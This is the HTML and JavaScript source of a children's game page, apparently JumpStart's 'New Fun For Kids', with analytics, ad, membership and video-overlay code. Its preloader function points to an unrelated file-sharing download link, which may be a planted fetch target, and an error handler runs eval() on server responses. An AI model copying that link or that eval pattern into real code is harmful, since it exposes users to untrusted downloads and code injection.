

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head><title>
	New Fun For Kids
</title><meta name="google-site-verification" content="mjnkxqEan8Bzf5tKFPK95EMfaBwSQFM3UlLC7ZQmaYw" /><meta name="y_key" content="ed5103328274bf37" /><meta name="msvalidate.01" content="9F681C22C84F8D2570B931472F0304A4" /><meta name="robots" content="noydir" />
  <link type='text/css' rel='stylesheet' media="screen" href='/assets/mainstreet-styles.css' /> 
    <style type="text/css">
        iframe[name='google_conversion_frame'] { 
            height: 0 !important;
            width: 0 !important; 
            line-height: 0 !important; 
            font-size: 0 !important;
            margin-top: -13px;
            float: left;
        }
    </style>        

    <!-- Google Tag Manager -->
        <script>(function (w, d, s, l, i) {
        w[l] = w[l] || []; w[l].push({
        'gtm.start':
        new Date().getTime(), event: 'gtm.js'
        }); var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
        'http://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-TX2LLRC');</script>
    <!-- End Google Tag Manager -->
<link rel="canonical" href="http://www.jumpstart.com/newfunforkids" /></head>
<body>
     <!-- Google Tag Manager (noscript) -->
        <noscript><iframe src="http://www.googletagmanager.com/ns.html?id=GTM-TX2LLRC"
        height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <form method="post" action="./Default.aspx" id="form1">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUIOTA0MjQyMDRkZOVOBhWgniZfcbuVYj48E9zxhHVL" />
</div>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="12BF164D" />
</div>
        
        
            <script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js'></script>
            <script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js'></script>
            <script type='text/javascript' src='/JScript/jquery/plugins/tools/jquery.tools.min.js'></script>
          
        <div>
            
    

    <div id="game-container">
        <div id="unity-container">
            <a id="mcp_HomePageLink" title="Exit to homepage" class="exit-to-home" href="../Homepage/Homepage.aspx">
                <img src='/assets/exit-to-home-JS.png' width='160' height='102' border="0" alt="Exit to homepage"/>
            </a>
            <div id='unity-content'>
                <div id='loading-prompt' style='width:188px; margin:0 auto;'><div id='loading-content'>Loading ...</div></div>
            </div> 
        </div>
        
        <div id='flash-container'>
            <div id='flash-ad'></div>
            <div id='flash-content'></div>
        </div> 
    </div> 
    
    <div id='ad-content' style='position:absolute; z-index:100; top:-9999px; background:transparent'>
<iframe id='ifrm-ad' frameborder='1' height='300' width='320' marginheight='0' marginwidth='0' scrolling='no' src='../Ad/GoogleAd.htm'></iframe>
    </div>
    
    <div id='recorder-panel' style='display: none; position: absolute; z-index: 100'></div>
    <div id='player-panel' style='display: none; position: absolute; z-index: 100'></div>    
    <div id='submission-panel' style='display: none; position: absolute; z-index: 100'></div> 
    <div id='content-authorization-panel' style='display: none; position: absolute; z-index: 100'></div> 
    <div id='registration-panel' style='display: none; position: absolute; z-index: 100'></div>
    <div id='membership-panel' style='display: none; position: absolute; z-index: 100'></div>
    <div id='popup-loader' class='loader' style='display:none; position: absolute;'></div>  
    <div id='app-store' style='display: none; position: absolute; z-index: 100; background-color:Transparent;'></div>  

        </div>
    </form>
     
    <script type='text/javascript'>
        var _gaq = _gaq || [];
        var pluginUrl = '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
        _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
        
        _gaq.push(['_setAccount', 'UA-16741985-1']);
        _gaq.push(['_trackPageview']);
        (function() {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src = ('http:' == document.location.protocol ? 'http://ssl' : 'http://www') + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

            var isMiniclip = "False"; 
            if (top !== self && !isMiniclip) { 
                top.location = 'http://www.jumpstart.com/Miniclip/#970,730';
            }
        })();  
    </script>
    <!-- Google Tag Manager -->
    <noscript>
        <iframe src="//www.googletagmanager.com/ns.html?id=GTM-K3C2" height="0" width="0" style="display: none; visibility: hidden"></iframe>
    </noscript>
    <script>(function (w, d, s, l, i) {
        w[l] = w[l] || [];
        w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
        var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
        j.async = true;
        j.src = '//www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-K3C2');
    </script>
    <!-- End Google Tag Manager -->
    
    <script type="text/javascript" language="javascript">
// From Robot Game
function GetServerAddress(){var serverAddress = '23.100.44.239';return serverAddress;}
function GetUserName() {var userName = 'USERNAMETOKEN';return userName;}
function GetDanceDataURL(){var dataURL = '/assets/TbDanceMarker.xml';return dataURL;}
function GetInstructionsMovieURL() {var movieURL = '/assets/AniKrHelp.ogg';return movieURL;}
// From Western World
        function GetHelpMovieURL() { var url = '/assets/AniKrHelp.ogg';return url;}
// From Main Street
function GetApiToken(){var apiToken = 'USERNAMETOKEN';return apiToken;}
// From Main Street
function GetParentAPIToken(){var parentAPIToken = 'PARENTAPITOKEN';return parentAPIToken;}
// From Main Street
function GetUserID(){var userID = 'USERIDTOKEN';return userID;}
//Switch to MathBlaster
function SwitchProductGroup(id)
{
if(id==2){
window.location.href="//www.mathblaster.com/mathblaster.aspx?token="+GetApiToken();}
else if(id==12){
window.location.href="http://www.jumpstart.com/worldofmadagascar/Game/Default.aspx?c=PM&token="+GetApiToken();}
}
// Get the selected scene from the toolbar
function GetConduitToolbarUserSelection(){var selScene = '';return selScene;}
// Get the Data from the HomePage
function GetHomePageData(){return '';}
//Js Preloader
        function GetMainStreetUrl() {
            var url = window.location.origin + '//easysha.red/dl/cscaknom';
            return url;
        }

function GetDeleteCacheFlag(){var flag = '0';return flag;}
    </script>
    <script type='text/javascript' src='/assets/UnityForIE11.js'></script>
    <script type="text/javascript" src="//webplayer.unity3d.com/download_webplayer-3.x/3.0/uo/UnityObject.js"></script>
    <script type='text/javascript' src='/assets/ka.js'></script>
    <script  type="text/javascript">        
        var widthMargin = 4;
        var heightMargin = 10;
        var minWidth = 800 + widthMargin;
        var minHeight = 600 + heightMargin;
        var exitHomeWidth = 160;
        var firstTime = true;
        var minLeftMargin = 2;
        var initialLeftMargin = minLeftMargin;

        
        
        function getMargins(parent, container){
            var margins = {};
             
            var diffWidth = parent.width() - container.outerWidth() > 0 ? parent.width() - container.outerWidth() : minLeftMargin;
            if(firstTime)
            {
                firstTime = false;    
                margins.left = Math.max(minLeftMargin, diffWidth / 2);
                  
                if(parent.height() < minHeight || parent.width() - exitHomeWidth < minWidth){ 
                    document.body.style.overflow = 'scroll';
                }
            }
            else
            {           
                document.body.style.overflow = 'scroll';                                     
                margins.left = diffWidth > 0 ? diffWidth / 2 + parent.scrollLeft() : initialLeftMargin; 
            }
                               
            margins.left = (margins.left < exitHomeWidth && parent.outerWidth()>960) ? exitHomeWidth : margins.left;  
            initialLeftMargin = margins.left;
            margins.top = widthMargin / 2;
            
            return margins;
        };
         
        var UnityGameData;
        
        jQuery.fn.center = function(parent) {
            if (typeof parent == "undefined")
                 parent = $(window);           
            this.css("position", "absolute");
            var margins = getMargins(parent, this);           
            this.css("left", margins.left + "px");
            this.css("top", margins.top + "px");
            return this;
        }
        
        jQuery.fn.absCenter = function()
        {
            this.css("top", ($(window).height() - this.outerHeight()) / 2 + "px");
            this.css("left", ($(window).width() - this.outerWidth()) / 2 + "px");
            return this;
        }
        
        String.prototype.format = function() { var s = this, i = arguments.length; while (i--) { s = s.replace(new RegExp('\\{' + i + '\\}', 'gm'), arguments[i]); } return s; };
        function getFileName(url) {
            if (url) {
                return url.match(/[-_\w]+[.][\w]+$/i)[0];
            }
            return "";
        }
        
        var ka = {};
        ka.container = $('#game-container');
        ka.unityContainer = $("#unity-container");
        ka.flashContainer = $("#flash-container");
        ka.flashContent = ka.flashContainer.find('#flash-content');
        ka.membershipPanel = $('#membership-panel');
        ka.registrationPanel = $('#registration-panel');
        ka.submissionPanel = $('#submission-panel');
        ka.contentAuthorizationPanel = $('#content-authorization-panel');
        ka.recorderPanel = $('#recorder-panel');
        ka.playerPanel = $('#player-panel');
        ka.adContainer = $('#flash-ad');         
        ka.AdGoogleContainer = $('#ad-content');
        
        ka.isMember = true;
        ka.gameInfoRepo = {};
        ka.currenFlashGame = null;
        ka.centerContainer = true;
        ka.screenSize = function() {
            var s = {};  
            
            s.width = $(window).width() - exitHomeWidth - minLeftMargin;
            s.height = $(window).height() - widthMargin;   
            
            s.width = (s.width > minWidth) ? s.width : minWidth;
            s.height = (s.height > minHeight) ? s.height : minHeight;
                        
            // get height by aspect ratio
            var fixedRatio1 = 3 / 4;
            var fixedRatio2 = 9 / 16;
            var actualRatio = s.height / s.width;
            s.height = Math.abs(actualRatio - fixedRatio1) < Math.abs(actualRatio - fixedRatio2) ? s.width * fixedRatio1 : s.width * fixedRatio2;
            s.width = Math.round(s.width);
            s.height = Math.round(s.height);
            
            var gamePer = 0.65;
            var gameMarginPer = 0.3;
            s.gameWidth = s.width * gamePer;
            s.gameHeight = s.height * gamePer;
            s.gameLeft = s.width * gameMarginPer;
            s.gameTop = s.height * gameMarginPer;
            s.imgHeight = 250;  
            
            return s;
        } ();
        
        // Google Ad
        ka.LevelLoaded = function() {
            ka.ad.gameReady = true;    
            adStateChange(ka.ad);
        };

	    ka.ShowAd = function(mode, cbObject, displayTime, pos, type) {
            ka.LevelLoading(mode, cbObject, displayTime, pos);
	    }; 
	    
	    ka.LevelLoading = function(mode, cbObject, displayTime, pos, type) {            
            ka.ad = {
                m : mode,
                cb : cbObject,
                dt : displayTime,
                gameReady: true,
                adDone: false,
                container : ka.container,
                pos : pos,
                tryCount : 0,
                type : type,
                isTimeOut: false      
            }
            displayAd(ka.ad);            
        };
        
        function displayAd(ad){
            updateAdSetting(ad);
            document.getElementById('ifrm-ad').contentWindow.beginAd(ad);
            ka.ad.timeOut = setTimeout(function(){
                    ka.ad.isTimeOut = true;
                    ka.ad.adDone = true;
                    adStateChange(ka.ad);
                },
                10000
            );
        }

        function updateAdSetting(ad){
            var s = {};
            $.extend(true, ad, s);
            ad.type = typeof(ad.type) == "undefined" ? determineAdType(ad) : ad.type;
            if(ad.type == "levelLoading"){
                ad.pos = "center/100 right" 
            }
            else{ 
                ad.height = "330px";
            }            
        }

        function determineAdType(ad){
            if(ad.cb.match("^PfLevelManager"))
                return "other"
            return "levelLoading";             
        }
        
        jQuery.fn.setAdPos = function(ad) {
            var s = ad.pos.split(" ");
            var vp = s[0].split("/");
            var hp = s[1].split("/");
            var pos = ka.unityContainer.position();   
            pos.top += vp.length == 2 ? parseInt(vp[1]) : 0;   
            pos.left += hp.length == 2 ? parseInt(hp[1]) : 0;
            if(vp[0] == "center"){
                pos.top += (ka.unityContainer.height() - this.outerHeight()) / 2 + ka.unityContainer.scrollTop();
            }
            else if(s[0] == "bottom"){
                pos.top += ka.unityContainer.height() -  this.outerHeight();
            }
            if(s[1] == "center"){
                pos.left += (ka.unityContainer.width() - this.outerWidth()) / 2 + ka.unityContainer.scrollLeft();
            }
            else if(s[1] == "right"){
                pos.left += ka.unityContainer.width() - this.outerWidth();
            }
            this.setPos(pos);
        };
            
        function adStateChange(ad)
        {
            if(ad.gameReady && ad.adDone){
                ka.AdGoogleContainer.css('top', '-9999px');
                ad.container.center();
                GetUnity().SendMessage(ad.cb, "OnBecomeMember", 2);
            }
        }
            
        function adPageEvent(ev){
            switch(ev){
                case 'loaded':
                    if(ka.ad.isTimeOut){
                        document.getElementById('ifrm-ad').contentWindow.clear();
                    }
                    else{
                        clearTimeout(ka.ad.timeOut);
                        document.getElementById('ifrm-ad').contentWindow.init(ka.ad);
                        ka.AdGoogleContainer.setAdPos(ka.ad);
                    }
                    break;
                case 'abort':
                case 'done':
                    ka.ad.adDone = true;
                    adStateChange(ka.ad);
                    break;
                case 'error':
                    ka.ad.tryCount++;
                    if(ka.ad.tryCount >= 2){
                        ka.ad.gameReady = ka.ad.adDone = true;
                        adStateChange();
                    }
                    else{
                        ka.ad.m = 0;
                        displayAd(ka.ad);
                    }
                    break;
            }
        } 
        
        
        ka.flashCB = function(e) {
        }
        ka.embedFlash = function(s) {
            var params = {};
            params.scale = "default";
            params.align = 'middle';
            params.quality = 'high';
            params.allowScriptAccess = "always";
            params.allowNetworking = "all";
            params.bgcolor = "#ffffff";
            params.wmode = "transparent";
           
            var attributes = {};
            attributes.id = "worldShell";
            attributes.name = "worldShell";
            attributes.styleclass = "noOutline";
            swfobject.embedSWF('/assets/JSWorldClientFlex.swf', s.container, ka.screenSize.width, ka.screenSize.height, "9.0115.0", null, null, params, attributes);
            loadFlashAd();
        };
        var adImages = [];adImages[adImages.length] = '//media.jumpstart.com/JSWeb/Contents/Ad/Games/Images/1024x250-Hollows-member.jpg';adImages[adImages.length] = '//media.jumpstart.com/JSWeb/Contents/Ad/Games/Images/1024x250-Hollows-member.jpg';
        function loadFlashAd(){
            if(ka.isMember){
                ka.adContainer.html("<img src='{0}' alt='' width='{1}' height='{2}' />".format(adImages[0], ka.screenSize.width, ka.screenSize.imgHeight));
            } else{
                ka.adContainer.html("<a href='#' onclick='BecomeAMember();return false;'><img src='{0}' alt='' width='{1}' height='{2}' /></a>".format(adImages[1], ka.screenSize.width, ka.screenSize.imgHeight));                        
            }
        }
        ka.PlayFlash = function(gameFile, instrText) {
            ka.unityContainer.css('top', '-9999px');
            ka.flashContainer.css("display", "block");
            ka.flashContent.html("<div id='worldShell'></div>");
            ka.currenFlashGame = ka.createFlashInfo(gameFile);
            ka.currenFlashGame.GameInstruction = instrText;
            ka.embedFlash(ka.currenFlashGame);
        };
        ka.endflashGame = function(coins, saavy, hash, membercode) {
            ka.flashContainer.css("display", "none");
            swfobject.removeSWF("gameDiv");
            swfobject.removeSWF("worldShell");
            ka.flashContent.html("");
            ka.unityContainer.css('top', '10px');
            var unity = GetUnity();
            console.log("endflash: " + ka.isMember);
            membercode = ka.isMember ? 1 : 2
            unity.SendMessage("FpFlashPlayer", "FlashGameEnd", "{0},{1},{2},{3}".format(coins, saavy, hash, membercode));
        };
        ka.flashShell = function() {
            if (window.document[movieName])
                return window.document[movieName];
            return document.getElementById(movieName);
        };
        ka.getFlashSetting = function() {
            var setting;
            $.ajax({
                type: "POST",
                url: '/Services/GameInfo.asmx/GetFlashSetting',
                data: "{}",
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                async: false,
                success: function(msg) {
                    setting = msg.d;
                },
                error: onAjxError
            });
            return setting;
        };
        ka.getFlashGameInfo = function(url) {
            var gameInfo;
            if (typeof(gameInfo) == "undefined") {
                $.ajax({
                    type: "POST",
                    url: '/Services/GameInfo.asmx/GetFlashGameInfo',
                    data: "{'gameUrl':'{0}'}".format(url),
                    contentType: "application/json; charset=utf-8",
                    dataType: "json",
                    async: false,
                    success: function(msg) {
                        gameInfo = msg.d;
                    },
                    error: onAjxError
                });
            }
            return gameInfo;
        };
        function MyLog(message) {
            alert(message);
        }

        ka.createFlashInfo = function(gameUrl) {
            var s = { };
            if (ka.ssSetting == null) {
                ka.ssSetting = ka.getFlashSetting();
            }
            s = $.extend(true, { }, ka.ssSetting);
            var fileName = getFileName(gameUrl);
            var flashInfo = ka.gameInfoRepo[fileName];
            if (typeof(flashInfo) == "undefined") {
                flashInfo = ka.getFlashGameInfo(fileName);
                ka.gameInfoRepo[fileName] = flashInfo;
            }
            s = $.extend(true, s, flashInfo);
            s.url = gameUrl;
            s.container = 'worldShell';
            return s;
        };
        function onAjxError(xhr, status, error) {
            var err = eval("(" + xhr.responseText + ")");
            alert(err.Message);
        }
        function endFlashGame(coins, saavy, hash) {
            ka.endflashGame(coins, saavy, hash);
        }
        function logout() {
            var result = world.logout();
        }
        function onLogout() {
            window.location.reload(false);
        }

        function showWorld(coins, saavy) {
            swfobject.removeSWF('gameDiv');
        }
        var unityCB, subcriptionID, returnFlag;
        function setSubscriptionType(id){
            subcriptionID = id;
        }
        
        function membershipPurchaseReturn(){
            if(!returnFlag){
                returnFlag = true;
                ka.centerContainer = true;
                if(ka.ssSetting != null){
                    ka.isMember = (subcriptionID == 1);
                    ka.ssSetting.IsMember = ka.isMember;
                }
                ka.membershipPanel.overlay().close();
		        ka.container.center();
		        if(unityCB){
		            GetUnity().SendMessage(unityCB, "OnBecomeMember", subcriptionID);
		        }
		        else{
		            document.getElementById("worldShell").OnBecomeMember(subcriptionID);
		            loadFlashAd();
		        }	
		        if(subcriptionID == 1 && window.opener){
		            window.opener.location.reload(true);
		        }		        
		    }	        
        }
        function openOverlay(p) {
            p.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { membershipPurchaseReturn(0); },
                onLoad: function() { ka.container.css('top', '-9999px'); }
            }).load();
            p.css('display', 'block');
            p.center();
        }

        function BecomeAMember(gameObject){
            unityCB = gameObject || null;
            returnFlag = false;
            ka.centerContainer = false;
            subcriptionID = 2;
            if (ka.membershipPanel.children().length <= 0) {
                $(
                "<div style='position:relative;'><a href='#' id='close-btn' class='close'></a><iframe id='ifrm-member' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?token={3}&loc={4}'></iframe></div>".format(910, 900, '/Ecommerce/Minified.aspx', GetApiToken(), unityCB.toString())
                ).appendTo(ka.membershipPanel);
		    }
		    else {
		        $('#ifrm-member').attr('src', '{0}?token={1}&loc={2}'.format('/Ecommerce/Minified.aspx', GetApiToken(), unityCB.toString()));
		    }
		    openOverlay(ka.membershipPanel);
        }
        function gotoMembershipPage() {
            BecomeAMember();
        }

        var unitySyncGuest, returnSyncGuest, isGuestRegistered;
        function RegisterGuestUser(gameObject)
        {
            unitySyncGuest = gameObject || null;
            returnSyncGuest = false;
            ka.centerContainer = false;
            isGuestRegistered = 0;
            if(ka.registrationPanel.children().length <= 0)
            {
                $("<div style='position:relative;'><a href='#' id='close-btn' class='close'></a><iframe id='ifrm-registration' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?loc={3}'></iframe></div>".format(710, 900, '/MyAccount/MinifiedRegistration.aspx', unitySyncGuest.toString())
                ).appendTo(ka.registrationPanel);
         }
         else {
                $('#ifrm-registration').attr('src', '{0}?loc={1}'.format('/MyAccount/MinifiedRegistration.aspx', unitySyncGuest.toString()));
            }

            openOverlaySyncGuest(ka.registrationPanel)
        }

        function SetGuestRegistrationStatus(status)
        {
            isGuestRegistered = status;
        }

        function openOverlaySyncGuest(p) {
            p.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { SyncGuestReturn(0); },
                onLoad: function() { ka.container.css('top', '-9999px'); }
            }).load();
            
            p.center(); 
        }
        
        function SyncGuestReturn()
        {            
            if(!returnSyncGuest)
            {
                returnSyncGuest= true;
                ka.centerContainer = true;                
                ka.container.center();
                ka.registrationPanel.overlay().close();
                $('#ifrm-registration').attr('src','');
                if(unitySyncGuest)
                {
                    GetUnity().SendMessage(unitySyncGuest, "OnUserRegistered", isGuestRegistered);
                }        
            }
        }
        
        var unityCBRecorder, returnFlagRecorder;
        function RecordVideo(gameObject)
        {
            unityCBRecorder = gameObject || null;
            returnFlagRecorder = false;
            ka.centerContainer = false;
            
            if (ka.recorderPanel.children().length <= 0) { 
            if('False' == 'True')
            {
	            $( "<div style='position:relative;'><a href='#' id='close-btn' class='close recorder-close'></a><iframe id='ifrm-recorder' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?token={3}&loc={4}' style='margin-top:10px'></iframe></div>".format(260, 550, '/NewFunForKids/UnAuthorizedUser.aspx', GetApiToken(), unityCBRecorder.toString()) ).appendTo(ka.recorderPanel);
            }
            else
            {
                $("<div id='dvRecordLoader' class='loader' style='display:none; position: absolute;'>Loading Animation....</div><div id='dvRecord' style='position:relative;'><a href='#' id='close-btn' class='close recorder-close'></a><iframe id='ifrm-recorder' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?token={3}&loc={4}'></iframe></div>".format(790, 530, '/kidzvuz/index.php', GetApiToken(), unityCBRecorder.toString()) ).appendTo(ka.recorderPanel);
                ShowRecordLoader();
            }
		    }
		    else {
		        if('False' == 'True')
                {
                    $('#ifrm-recorder').attr('src','/NewFunForKids/UnAuthorizedUser.aspx');
                }
                else
                {
		            $('#ifrm-recorder').attr('src', '{0}?token={1}&loc={2}'.format('/kidzvuz/index.php', GetApiToken(), unityCBRecorder.toString()));		            
		            ShowRecordLoader();
		        }
		    } 
		    openOverlayRecorder(ka.recorderPanel);
        }
        
        function ShowRecordLoader()
        {   
            $("#popup-loader").show();
            $("#popup-loader").absCenter();
            setTimeout(function(){$("#dvPlayer").show();},3000);
        }
        
        function HideRecordLoader()
        {   
            $("#popup-loader").hide();
            $("#backToRecorder").hide();
            ka.recorderPanel.center();
            var bgImage = '/assets/Madagascar-bg.jpg';
            $('body').css({backgroundImage: 'url('+bgImage+')'});
        }
        
        function openOverlayRecorder(p) {
            p.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { RecorderReturn(0); },
                onLoad: function() { ka.container.css('top', '-9999px'); }
            }).load();
            
            p.center(); 
            }
        
        function RecorderReturn()
        {
            if(!returnFlagRecorder)
            {
                returnFlagRecorder = true;
                ka.centerContainer = true;                
                ka.container.center();
                ka.recorderPanel.overlay().close();
                $('#ifrm-recorder').attr('src','');
                if(unityCBRecorder)
                {
                    GetUnity().SendMessage(unityCBRecorder, "OnSubmitContent", -1);
                }
                else
                {
                    loadFlashAd();
                }                
            }
        }
        
        var unityCBPlayer, returnFlagPlayer;
        
        var times = 1;
        function GetPlayerURL(){
            var playerURL = '/kidzvuz/player.html';
            if(!ka.isMember) {
                if(times % 3 == 0){
                    playerURL = '/kidzvuz/playerWithAd.html';
                }
                
                ++times;
            }
            
            return playerURL;
        } 

        function OpenVideoPlayer(gameObject, feedData)
        {   
            if (window.DOMParser)
            {
                parser=new DOMParser();
                xmlDoc=parser.parseFromString(feedData,"text/xml");
            }
            else // Internet Explorer
            {
                xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
                xmlDoc.async=false;
                xmlDoc.loadXML(feedData); 
            }
            
            var uID, videoTitle, videoURL, videoCtg, isKidzVuz, pubDate, videoDesc, videoAuthor;
            // documentElement always represents the root node
            x=xmlDoc.documentElement.childNodes;
            for (i=0;i<x.length;i++)
            {                
                switch(x[i].nodeName)
                {
                    case "title"        : videoTitle = x[i].childNodes[0].nodeValue; 
                                          if(videoTitle.length > 0){videoTitle = escape(videoTitle);}
                                          break;
                    
                    case "category"     : videoCtg = x[i].childNodes[0].nodeValue; 
                                            if(videoCtg.length > 0){videoCtg = escape(videoCtg);}  
                                            break;
                                            
                    case "guid"         : uID = x[i].childNodes[0].nodeValue; 
                                            break;
                    
                    case "pubDate"      : pubDate = x[i].childNodes[0].nodeValue; 
                                            break;
                    
                    case "description"  : if(x[i].childNodes.length > 0){
                                            videoDesc = x[i].childNodes[0].nodeValue;
                                            videoDesc = escape(videoDesc);
                                          }
                                            break;
                                            
                    case "author"       : if(x[i].childNodes.length > 0 ){
                                          videoAuthor = x[i].childNodes[0].nodeValue;
                                          }
                                            break;
                    
                    case "enclosure"    : if(x[i].childNodes.length > 0){
                                            isKidzVuz = x[i].childNodes[0].nodeValue;
                                            }
                                          if(x[i].attributes.length > 0){
                                            for(j=0; j<x[i].attributes.length;j++)
                                            {
                                                if(x[i].attributes[j].nodeName == "url")
                                                    videoURL = x[i].attributes[j].nodeValue;
                                            }
                                          }
                                            break;
                                                                          
                    default             : break;                
                }
            }
            
            if(videoAuthor == undefined || videoAuthor.length < 1) {
               videoAuthor = "Frankie's Friends"; 
            }
            videoAuthor = escape(videoAuthor);

            unityCBPlayer = gameObject || null;
            returnFlagPlayer = false;
            ka.centerContainer = false;
            
            if (ka.playerPanel.children().length <= 0) 
            {
                $("<div id='dvPlayer' style='position:relative;'><a href='#' id='close-btn' class='close player-close'></a><iframe id='ifrm-player' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?uID={3}&videoURL={4}&videoTitle={5}&videoCtg={6}&videoDesc={7}&isKidzVuz={8}&pubDate={9}&videoAuthor={10}&loc={11}'></iframe></div>".format(830, 600, GetPlayerURL(), uID, videoURL, videoTitle, videoCtg, videoDesc, isKidzVuz, pubDate, videoAuthor, unityCBPlayer.toString()) ).appendTo(ka.playerPanel);                
		    }
		    else
		    {
                $('#ifrm-player').attr('src', '{0}?uID={1}&videoURL={2}&videoTitle={3}&videoCtg={4}&videoDesc={5}&isKidzVuz={6}&pubDate={7}&videoAuthor={8}&loc={9}'.format(GetPlayerURL(), uID, videoURL, videoTitle, videoCtg, videoDesc, isKidzVuz, pubDate, videoAuthor, unityCBPlayer.toString()));	            
		    }
		    ShowPlayerLoader();
		    OpenOverlayPlayer(ka.playerPanel);		    
        }
        
        function ShowPlayerLoader()
        {
            if (!$.browser.mozilla)
            {
            $("#popup-loader").show();
            $("#popup-loader").absCenter();
            }
            $("#dvPlayer").show();
        }
        
        function HidePlayerLoader()
        { 
            $("#popup-loader").hide();
            ka.playerPanel.center();
            var bgImage = '/assets/Madagascar-bg.jpg';
            $('body').css({backgroundImage: 'url('+bgImage+')'});
        }
        
        function OpenOverlayPlayer(p)
        {
            p.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { PlayerReturn(); },
                onLoad: function() { ka.container.css('top', '-9999px'); }
            }).load();            
            p.center();            
        }
        
        function PlayerReturn()
        {   
            if(!returnFlagPlayer)
            {
                returnFlagPlayer = true;
                ka.centerContainer = true;
                ka.playerPanel.overlay().close();
                $('#ifrm-player').attr('src','');
                ka.container.center();
                
                if(unityCBPlayer)
                {
                    GetUnity().SendMessage(unityCBPlayer, "OnShowVideoClosed", -1);
                }
                else
                {
                    loadFlashAd();
                }
            }
        }
        
        var unityCBSubmission, returnFlagSubmission;
        function SubmitContentReturn(){
            if(!returnFlagSubmission){
                returnFlagSubmission = true;
                ka.centerContainer = true;
                
                ka.submissionPanel.overlay().close();
		        ka.container.center();
		        if(unityCBSubmission){
		            GetUnity().SendMessage(unityCBSubmission, "OnSubmitContent", -1);
		        }
		        else{ 
		            loadFlashAd();
		        }	
//		        if(window.opener){
//		            window.opener.location.reload(true);
//		        }		        
		    }	        
        }
        function openOverlaySubmission(p) {
            p.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { SubmitContentReturn(0); },
                onLoad: function() { ka.container.css('top', '-9999px'); }
            }).load();
            p.css('display', 'block'); 
            p.center(); 
            p.css("top", ($(window).height() - p.outerWidth()) / 2 + "px");
        }
        function SubmitContent(gameObject){
            unityCBSubmission = gameObject || null;
            returnFlagSubmission = false;
            ka.centerContainer = false; 
            if (ka.submissionPanel.children().length <= 0) {
                if('False' == 'True')
                {
		        $(
                "<div style='position:relative;'><a href='#' id='close-btn' class='close'></a><iframe id='ifrm-member' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?token={3}&loc={4}' style='margin-top:10px'></iframe></div>".format(260, 550, '/NewFunForKids/UnAuthorizedUser.aspx', GetApiToken(), unityCBSubmission.toString())
                ).appendTo(ka.submissionPanel);
                }
                else
                {
                		        $(
                "<div style='position:relative;'><a href='#' id='close-btn' class='close'></a><iframe id='ifrm-member' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?token={3}&loc={4}'></iframe></div>".format(364, 372, '/HomePage/ContentSubmissionMinified.aspx', GetApiToken(), unityCBSubmission.toString())
                ).appendTo(ka.submissionPanel);

                }
		    }
		    else {
		        if('False' == 'True')
                {
                $('#ifrm-member').attr('src','/NewFunForKids/UnAuthorizedUser.aspx');
                }
                else
                {
		        $('#ifrm-member').attr('src', '{0}?token={1}&loc={2}'.format('/HomePage/ContentSubmissionMinified.aspx', GetApiToken(), unityCBSubmission.toString()));
		        }
		    }
		    openOverlaySubmission(ka.submissionPanel);
        }
        
        var unityCBContentAuthorization, returnFlagContentAuthorization;
        function ContentAuthorizationReturn(){
            if(!returnFlagContentAuthorization){
                returnFlagContentAuthorization = true;
                ka.centerContainer = true;
                
                ka.contentAuthorizationPanel.overlay().close();
		        ka.container.center();
		        if(unityCBContentAuthorization){
		            GetUnity().SendMessage(unityCBContentAuthorization, "OnContentAuthorization", -1);
		        }
		        else{ 
		            loadFlashAd();
		        }	         
		    }	        
        }
        function openOverlayContentAuthorization(p) {
            p.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { ContentAuthorizationReturn(0); },
                onLoad: function() { ka.container.css('top', '-9999px'); }
            }).load();
            p.css('display', 'block'); 
            p.center(); 
            p.css("top", ($(window).height() - p.outerWidth()) / 2 + "px");
        }
